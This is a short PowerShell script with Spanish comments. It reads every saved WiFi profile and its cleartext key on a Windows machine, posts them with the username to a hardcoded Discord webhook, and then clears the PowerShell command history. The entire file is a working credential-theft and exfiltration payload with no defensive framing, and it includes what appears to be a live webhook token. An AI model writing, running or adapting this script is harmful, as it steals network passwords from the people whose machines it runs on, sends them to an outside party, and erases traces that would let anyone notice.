# Define el webhook de Discord
$discord = 'https://discord.com/api/webhooks/1337777716400750653/DC-CLE508_de0GFHisbzCCUrlUjq1DFo7MnGyF_ZkGMHUudzsgsad128-KwqQspzeiBu'

# Recolectar perfiles WiFi y contraseñas
netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'

    # Crea el cuerpo del mensaje a enviar a Discord
    $Body = @{
        'username' = $env:username + " | " + [string]$wlan
        'content'  = [string]$passw
    }

    # Envía el mensaje a Discord
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
}

# Limpiar el historial de comandos de PowerShell
Clear-History
